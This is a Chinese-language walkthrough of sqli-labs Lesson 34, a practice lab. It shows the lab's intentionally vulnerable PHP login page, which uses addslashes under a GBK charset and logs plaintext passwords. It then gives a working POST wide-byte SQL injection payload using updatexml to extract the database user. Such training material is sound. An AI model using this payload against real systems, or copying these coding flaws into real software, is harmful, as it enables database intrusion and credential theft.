## sqli-labs第三十四关 ##
先看代码：
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Less-34- Bypass Add SLASHES</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"> Welcome&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br></div>

<div  align="center" style="margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;">

<div style="padding-top:10px; font-size:15px;">
 

<!--Form to post the data for sql injections Error based SQL Injection-->
<form action="" name="form1" method="post">
	<div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;
	    <input type="text"  name="uname" value=""/>
	</div>  
	<div> Password  : &nbsp;&nbsp;&nbsp;
		<input type="text" name="passwd" value=""/>
	</div></br>
	<div style=" margin-top:9px;margin-left:90px;">
		<input type="submit" name="submit" value="Submit" />
	</div>
</form>

</div>
</div>
<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">
<font size="3" color="#FFFF00">
<center>
<br>
<br>
<br>
<img src="../images/Less-34.jpg" />
</center>

<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");


// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname1=$_POST['uname'];
	$passwd1=$_POST['passwd'];

        //echo "username before addslashes is :".$uname1 ."<br>";
        //echo "Input password before addslashes is : ".$passwd1. "<br>";
        
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname1);
	fwrite($fp,'Password:'.$passwd1."\n");
	fclose($fp);
        
        $uname = addslashes($uname1);
        $passwd= addslashes($passwd1);
        
        //echo "username after addslashes is :".$uname ."<br>";
        //echo "Input password after addslashes is : ".$passwd;    

	// connectivity 
	mysql_query("SET NAMES gbk");
	@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in\n\n " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		echo 'Your Login name:'. $row['username'];
		echo "<br>";
		echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"  />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysql_error());
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg" />';	
		echo "</font>";  
	}
}

?>

</br>
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
 
echo "Hint: The Username you input is escaped as : ".$uname ."<br>";
echo "Hint: The Password you input is escaped as : ".$passwd ."<br>";
?>

</font>
</div>
</body>
</html>
```
也是GBK编码，还是宽字节注入，只不过请求方式变为了POST。准确的说应该是，POST宽字节注入
payload：
```
POST /sqli-labs-master/Less-34/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/sqli-labs-master/Less-34/
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

uname=admin%df' and updatexml(1,concat(0x7e,(select user()),0x7e),1) %23&passwd=admin&submit=Submit
```
反回结果：
![k3P5Tg.png](https://s2.ax1x.com/2019/01/31/k3P5Tg.png)